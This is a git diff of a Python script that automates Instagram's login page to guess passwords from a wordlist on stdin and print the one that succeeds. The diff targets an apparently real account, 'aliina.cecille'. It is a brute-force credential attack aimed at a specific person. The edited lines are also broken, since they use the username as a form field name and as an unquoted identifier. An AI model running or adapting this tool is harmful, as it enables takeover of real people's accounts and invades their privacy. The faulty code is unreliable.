@@ -12,13 +12,13 @@ def logInSuccess(browser):
 
 correctPassword = None
 account_username = sys.argv[1]
-with Browser('firefox', headless=True) as browser:
+with Browser('chrome', headless=True) as browser:
     browser.visit('https://www.instagram.com')
     browser.find_by_text("Log in").first.click()
-    username_form = browser.find_by_name('username').first
+    username_form = browser.find_by_name('aliina.cecille').first
     password_form = browser.find_by_name('password').first
     login_button = browser.find_by_text('Log in').first
-    username_form.fill(account_username)
+    username_form.fill(aliina.cecille)
     for password in sys.stdin:
         if len(password) < 6:
             print('Skipping password: ' + password)
@@ -40,5 +40,6 @@ with Browser('firefox', headless=True) as browser:
         print("Unable to find correct password.")
     else:
         print("Password for username: " + account_username + " = " + password)
+        
 
 
